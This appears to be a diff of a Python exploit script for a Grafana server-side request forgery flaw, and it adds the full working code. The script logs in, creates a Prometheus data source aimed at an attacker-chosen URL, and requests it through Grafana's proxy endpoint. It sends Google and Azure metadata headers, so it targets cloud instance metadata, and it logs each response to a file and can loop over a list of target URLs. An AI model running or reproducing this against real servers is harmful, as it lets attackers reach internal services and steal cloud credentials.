@@ -5,6 +5,7 @@
 # Note: The SSRF exploit attempted by this script does not follow redirects.
 
 # Importing the required libraries
+
 import requests
 import json
 import sys
@@ -20,7 +21,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 # Creating a new session object that will persist across requests
 session = requests.Session()
 
-# Parsing arguments from the command line
+
 parser = argparse.ArgumentParser()
 
 # The user can optionally provide a session cookie. If not provided, a default value is used.
@@ -44,49 +45,146 @@ parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for 
 # Parsing the arguments
 args = parser.parse_args()
 
-# Assigning parsed arguments to variables
 ssrf_url = args.url
 sessionid = args.session
 ghost = args.host
+files = args.file
 username = args.username
 password = args.password
 
-# If a proxy is provided, it's set up as the environment variable for the current session
+
+
 if args.proxy:
 	http_proxy = args.proxy
 	os.environ['HTTP_PROXY'] = http_proxy
 	os.environ['HTTPS_PROXY'] = http_proxy
+            
+        
+def create_source(sessionid,ssrf_url,ghost):
 
-# Function to create a source in the Grafana instance.
-def create_source(sessionid, ssrf_url,ghost):
-	# Preparing the request body and headers
-	# The request is sent to /api/datasources endpoint of the Grafana instance
-	# If the source with the same name already exists, the script will exit and prompt user to delete it manually.
-	# If the source is successfully created, the function will return the ID of the new source.
 
-# Function to refresh the data source in Grafana. The request is sent to /api/datasources/{id} endpoint of the Grafana instance.
-# If the source is successfully refreshed, it prints "Refreshed Sources", else, it deletes the source and print the error.
+	rawBody = "{\"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"access\":\"proxy\",\"isDefault\":false}"
+	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/new","Connection":"close","x-grafana-org-id":"1","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+	cookies = {"grafana_session":""+sessionid+""}
+	response = session.post(""+ghost+"/api/datasources", data=rawBody, headers=headers, cookies=cookies,verify=False)
+	y = json.loads(response.text)
+	if "Data source with same name already exists" in response.text:
+		print("You will need to manually delete the current source that is named SSRF-TESTING")
+		sys.exit(0)
+	elif "id" in response.text:
+		print("Source Created")
+		return (y["id"])
+	else:
+		print ("Error:")
+		print("Status code:   %i" % response.status_code)
+		print(response.text)
+		
 
-# Function to create a SSRF in the Grafana instance.
-# If the SSRF is successfully created, it prints "SSRF Source Updated", else, it deletes the source and print the error.
 
-# Function to check if the SSRF is working by sending a GET request to /api/datasources/proxy/{id}/ endpoint of the Grafana instance.
-# If the response status code is not 502, it prints the status code and response body, else, it deletes the source and print the error.
 
-# Function to delete a data source in the Grafana instance. The request is sent to /api/datasources/{id} endpoint of the Grafana instance.
-# If the data source is successfully deleted, it prints "Deleted Old SSRF Source", else, it exits the script and print the error.
+def refresh_source(ghost,sessionid,id):
+	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/6/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+	cookies = {"grafana_session":""+sessionid+""}
+	response = session.get(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False)
+	if response.status_code == 200:
+		print("Refreshed Sources")
+	else:
+		print("Error:")
+		print("Status code:   %i" % response.status_code)
+		print(response.text)
+		delete_source(sessionid,id,ghost)
+		
 
-# Function to log in to the Grafana instance. It sends a POST request to /login endpoint of the Grafana instance.
-# If the login is successful, it returns the session cookie, else, it exits the script and print the error.
+def create_ssrf(sessionid,ssrf_url,ghost,id):
+	rawBody = "{\"id\":"+id+",\"orgId\":1,\"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"typeLogoUrl\":\"\",\"access\":\"proxy\",\"url\":\""+ssrf_url+"\",\"password\":\"test\",\"user\":\"test\",\"database\":\"test\",\"basicAuth\":false,\"basicAuthUser\":\"\",\"basicAuthPassword\":\"\",\"withCredentials\":false,\"isDefault\":false,\"jsonData\":{\"tlsSkipVerify\":true,\"httpHeaderName1\":\"Metadata-Flavor\",\"httpHeaderName2\":\"Metadata\",\"httpMethod\":\"GET\"},\"secureJsonData\":{\"httpHeaderValue1\":\"Google\",\"httpHeaderValue2\":\"true\"},\"version\":1,\"readOnly\":false}"
+	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/6/","Connection":"close","x-grafana-org-id":"1","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+	cookies = {"grafana_session":""+sessionid+""}
+	response = session.put(""+ghost+"/api/datasources/"+id+"", data=rawBody, headers=headers, cookies=cookies,verify=False)
+	if response.status_code == 200:
+		print("SSRF Source Updated")
+	else:
+		print("Error:")
+		print("Status code:   %i" % response.status_code)
+		print(response.text)
+		delete_source(sessionid,id,ghost)
+				
+	
 
-# If the user has provided a username, it uses the login function to get the sessionid
+def check_ssrf(sessionid,id,ghost,ssrf_url):
+	headers = {"Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/"+id+"/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","x-grafana-nocache":"true"}
+	cookies = {"grafana_session":""+sessionid+""}
+	response = session.get(""+ghost+"/api/datasources/proxy/"+id+"/", headers=headers, cookies=cookies,verify=False)
+	if response.status_code != 502:
+		print("Status code:   %i" % response.status_code)
+		print("Response body:\n %s" % response.text)
+		gghost = ghost.partition('://')[2]
+		sub_addr = gghost.partition('.')[0]
+		text_file = open(""+sub_addr+".txt", "a")
+		text_file.write("SSRF URL: %s\n" % ssrf_url)
+		text_file.write("Status code:   %i\n" % response.status_code)
+		text_file.write("Response body: %s\n\n\n\n" % response.text)
+		text_file.close()
+		delete_source(sessionid,id,ghost)
+	else:
+		print("Error:")
+		print(response.text)
+		delete_source(sessionid,id,ghost)
+
+
+
+
+def delete_source(sessionid,id,ghost):
+
+	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/datasources/edit/3/","Connection":"close","x-grafana-org-id":"1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+	cookies = {"grafana_session":""+sessionid+""}
+	response = session.delete(""+ghost+"/api/datasources/"+id+"", headers=headers, cookies=cookies,verify=False)
+	if "Data source deleted" in response.text:
+		print("Deleted Old SSRF Source")
+	else:
+		print("Error:")
+		print(response.text)
+		sys.exit(0)
+
+
+
+def login(ghost,username,password):
+	rawBody = "{\"user\":\""+username+"\",\"password\":\""+password+"\",\"email\":\"\"}"
+	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/signup","Connection":"close","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
+	cookies = {"redirect_to":"%2F"}
+	response = session.post(""+ghost+"/login", data=rawBody, headers=headers, cookies=cookies,verify=False)
+	if "grafana_session" in response.cookies:
+		return response.cookies["grafana_session"]
+	if "grafana_sess" in response.cookies:
+		return response.cookies["grafana_sess"]
+	else:
+		print("Login Session Cookie not set")
+		sys.exit(0)
+
+
+
 if username:
 	sessionid = login(ghost,username,password)
+	
 
-# If the user has provided a SSRF URL, it creates a source, refreshes the source, creates a SSRF, and checks the SSRF.
+
+
 if ssrf_url:
-	i = create_source(sessionid,ssrf_url,ghost)
+	i = create_source (sessionid,ssrf_url,ghost)
 	id = str(i)
 	refresh_source(ghost,sessionid,id)
 	create_ssrf(sessionid,ssrf_url,ghost,id)
 	check_ssrf(sessionid,id,ghost,ssrf_url)
+
+if files:
+	if os.path.exists(files):
+		with open(files, 'r') as f:
+			for line in f:
+				ssrf_url = line.replace("\n","")
+				i = create_source (sessionid,ssrf_url,ghost)
+				id = str(i)
+				refresh_source(ghost,sessionid,id)
+				create_ssrf(sessionid,ssrf_url,ghost,id)
+				check_ssrf(sessionid,id,ghost,ssrf_url)
+			f.close()
+
+
